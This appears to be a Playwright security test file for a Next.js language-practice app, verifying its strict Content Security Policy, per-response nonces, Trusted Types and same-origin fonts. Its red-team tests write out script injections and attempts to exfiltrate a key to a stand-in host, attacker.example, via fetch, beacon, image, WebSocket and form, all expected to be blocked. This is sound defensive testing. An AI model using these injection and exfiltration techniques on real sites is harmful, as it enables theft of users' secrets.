import { expect, type Page, test } from "@playwright/test";

import { SENTINEL } from "./leak-guard";

/**
 * The strict CSP and Trusted Types on the built output (architecture.md §6.4; Phase 7
 * Slice 1; ADR 22, progress.md D133–D136). Runs in the `offline` project, on `next start`,
 * because `next dev` serves a relaxed policy (`lib/csp.ts`).
 *
 * Two halves:
 * - **Every page carries its own nonce and breaks none of the policy.** A violation on a
 *   real page means the policy is wrong for the app, and a page that loses its chunks
 *   stops working. So the gate is zero.
 * - **The deliberate attempt to get the key out** (§7 Phase 7's security review). First, a
 *   script tag injected into the page must not run. Then an attacker's code that has
 *   somehow come to run (simulated by `page.evaluate`) tries each way to write more script
 *   into the page and each way to send the key off this origin. Every one must fail and
 *   reach no network. DevTools evaluation is exempt from the policy's eval check, so
 *   `eval` and `Function` are not tried there: the header test holds `'unsafe-eval'` out,
 *   and the zod probe this slice silenced was the page's own `Function`, refused (D134).
 */

/** Every page route, in both locales. */
const PAGES = [
  "",
  "/about",
  "/diagnostic",
  "/exam",
  "/exam/results",
  "/exam/run",
  "/home",
  "/practice/oral",
  "/practice/oral/report",
  "/practice/reading",
  "/practice/writing",
  "/practice/writing/generate",
  "/practice/writing/workshop",
  "/privacy",
  "/progress",
  "/review",
  "/settings/data",
  "/settings/key",
  "/settings/key/guide",
  "/settings/sync",
  "/start",
  // The localised 404 (D141): an unknown path renders inside the layout, so it is held to the policy too.
  "/no-such-page",
  // …and one with a dot, which the proxy's first matcher would skip, leaving it with no CSP at all.
  "/no-such.page",
];

const ATTACKER = "https://attacker.example";

/** Collects every CSP and Trusted Types violation a page reports, from before its first script. */
const recordViolations = async (page: Page) => {
  await page.addInitScript(() => {
    const seen: string[] = [];
    Object.defineProperty(window, "__cspViolations", { value: seen });
    document.addEventListener("securitypolicyviolation", (event) => {
      seen.push(`${event.effectiveDirective} ${event.blockedURI} ${event.sample}`);
    });
  });
  return () => page.evaluate(() => (window as unknown as { __cspViolations: string[] }).__cspViolations.slice());
};

/**
 * Every request that leaves the page for the attacker's origin. Recorded where the request
 * is answered, not on the page's `request` event: Chromium reports a request the policy
 * then blocks there too, so only an answered one has really gone.
 */
const watchAttacker = async (page: Page) => {
  const reached: string[] = [];
  await page.context().route(`${ATTACKER}/**`, (route) => {
    reached.push(`${route.request().method()} ${route.request().resourceType()} ${route.request().url()}`);
    return route.fulfill({ status: 200, body: "ok" });
  });
  return reached;
};

for (const locale of ["en", "fr"]) {
  test(`every /${locale} page carries its own nonce and breaks none of the policy`, async ({ page }) => {
    test.setTimeout(120_000);
    const violations = await recordViolations(page);

    for (const path of PAGES) {
      const response = await page.goto(`/${locale}${path}`);
      await page.waitForLoadState("networkidle");
      const policy = response?.headers()["content-security-policy"] ?? "";
      const nonce = /'nonce-([^']+)'/.exec(policy)?.[1];

      expect(policy, path).toContain("require-trusted-types-for 'script'");
      expect(nonce, path).toBeDefined();
      // Every script Next rendered carries this response's nonce: none is left to be blocked.
      const html = (await response?.text()) ?? "";
      const scripts = html.match(/<script\b[^>]*>/g) ?? [];
      expect(scripts.length, path).toBeGreaterThan(0);
      for (const tag of scripts) expect(tag, path).toContain(`nonce="${nonce ?? ""}"`);
      expect(await violations(), path).toEqual([]);
    }
  });
}

test("the three self-hosted faces load from this origin under the policy (D159)", async ({ page }) => {
  const violations = await recordViolations(page);
  const fontRequests: string[] = [];
  page.on("request", (request) => {
    if (request.resourceType() === "font") fontRequests.push(new URL(request.url()).origin);
  });
  await page.goto("/fr/about");
  await page.waitForLoadState("networkidle");

  const faces = await page.evaluate(async () => {
    const root = getComputedStyle(document.documentElement);
    const families = ["--font-sans", "--font-display", "--font-serif"].map((name) =>
      root.getPropertyValue(name).split(",")[0]?.trim() ?? "",
    );
    // A face not used on this page (the passage serif) loads when asked, as a passage would.
    await Promise.all(families.map((family) => document.fonts.load(`16px ${family}`, "àéèçœ«»")));
    return families.map((family) => ({ family, loaded: document.fonts.check(`16px ${family}`, "àéèçœ«»") }));
  });
  expect(faces).toHaveLength(3);
  for (const face of faces) expect(face.family, JSON.stringify(faces)).not.toBe("");
  for (const face of faces) expect(face.loaded, face.family).toBe(true);
  // Body text and headings are in the self-hosted faces, not the system's.
  const unquoted = (family: string) => family.replaceAll('"', "").replaceAll("'", "");
  const body = await page.evaluate(() => getComputedStyle(document.body).fontFamily);
  const heading = await page.evaluate(() => getComputedStyle(document.querySelector("h1") as Element).fontFamily);
  expect(unquoted(body).startsWith(unquoted(faces[0]?.family ?? "missing"))).toBe(true);
  expect(unquoted(heading).startsWith(unquoted(faces[1]?.family ?? "missing"))).toBe(true);
  expect(fontRequests.length).toBeGreaterThan(0);
  expect(new Set(fontRequests)).toEqual(new Set([new URL(page.url()).origin]));
  expect(await violations()).toEqual([]);
});

test("a fresh nonce on every response", async ({ request }) => {
  const nonceOf = async () =>
    /'nonce-([^']+)'/.exec((await request.get("/en")).headers()["content-security-policy"] ?? "")?.[1];

  expect(await nonceOf()).not.toBe(await nonceOf());
});

test("the red team: an injected script tag does not run", async ({ page }) => {
  const violations = await recordViolations(page);
  await page.goto("/en/home");
  await page.waitForLoadState("networkidle");

  // Playwright writes the tag as the page would, so the policy decides whether it runs.
  await page.addScriptTag({ content: "window.__pwnedTag = true" }).catch(() => undefined);
  await page.addScriptTag({ url: `${ATTACKER}/payload.js` }).catch(() => undefined);

  expect(await page.evaluate(() => (window as unknown as { __pwnedTag?: boolean }).__pwnedTag)).toBeUndefined();
  expect((await violations()).length).toBeGreaterThan(0);
});

test("the red team: script the page did not ship cannot be written, and the key cannot leave for another origin", async ({
  page,
}) => {
  const violations = await recordViolations(page);
  const reached = await watchAttacker(page);
  await page.goto("/en/home");
  await page.waitForLoadState("networkidle");

  const attempts = await page.evaluate(
    async ({ attacker, key }) => {
      const outcome = async (attempt: () => unknown): Promise<string> => {
        try {
          await attempt();
          return "ran";
        } catch (error) {
          return (error as Error).name;
        }
      };
      const flags = window as unknown as Record<string, unknown>;
      const results: Record<string, string> = {};

      // Running more script.
      results.inlineScript = await outcome(() => {
        const script = document.createElement("script");
        script.textContent = "window.__pwnedInline = true";
        document.body.append(script);
      });
      results.foreignScript = await outcome(() => {
        const script = document.createElement("script");
        script.src = `${attacker}/payload.js`;
        document.body.append(script);
      });
      results.dataScript = await outcome(() => {
        const script = document.createElement("script");
        script.src = "data:text/javascript,window.__pwnedData=true";
        document.body.append(script);
      });
      results.innerHtml = await outcome(() => {
        document.body.insertAdjacentHTML("beforeend", `<img src="x" onerror="window.__pwnedHtml = true">`);
      });

      // Sending the key off this origin.
      const leak = `${attacker}/collect?key=${encodeURIComponent(key)}`;
      results.fetch = await outcome(() => fetch(leak, { method: "POST", body: key, mode: "no-cors" }));
      // A beacon is only queued, so its proof is that nothing reaches the attacker.
      navigator.sendBeacon(leak, key);
      results.image = await outcome(
        () =>
          new Promise<void>((resolve, reject) => {
            const image = new Image();
            image.onload = () => resolve();
            image.onerror = () => reject(new Error("refused"));
            image.src = leak;
          }),
      );
      results.webSocket = await outcome(
        () =>
          new Promise<void>((resolve, reject) => {
            const socket = new WebSocket(`wss://attacker.example/collect?key=${encodeURIComponent(key)}`);
            socket.onopen = () => resolve();
            socket.onerror = () => reject(new Error("refused"));
          }),
      );
      results.form = await outcome(() => {
        const form = document.createElement("form");
        form.method = "post";
        form.action = leak;
        form.target = "_blank";
        document.body.append(form);
        form.submit();
      });
      // Anything that did run would have had a moment to call home.
      await new Promise((resolve) => setTimeout(resolve, 500));

      results.pwned = ["__pwnedInline", "__pwnedData", "__pwnedHtml"]
        .filter((flag) => flags[flag] === true)
        .join(",");
      return results;
    },
    { attacker: ATTACKER, key: SENTINEL },
  );

  // Trusted Types refuses the sinks outright, and each way out is refused before it leaves.
  expect(attempts).toMatchObject({
    inlineScript: "TypeError",
    foreignScript: "TypeError",
    dataScript: "TypeError",
    innerHtml: "TypeError",
    fetch: "TypeError",
    image: "Error",
    webSocket: "Error",
    pwned: "",
  });
  expect(reached).toEqual([]);
  // Each refusal was the policy's, and reported as such: Trusted Types for the four sinks
  // (so script-src never has to), and a directive for each way out.
  const directives = new Set((await violations()).map((violation) => violation.split(" ")[0]));
  expect([...directives].sort()).toEqual(["connect-src", "form-action", "img-src", "require-trusted-types-for"]);
});
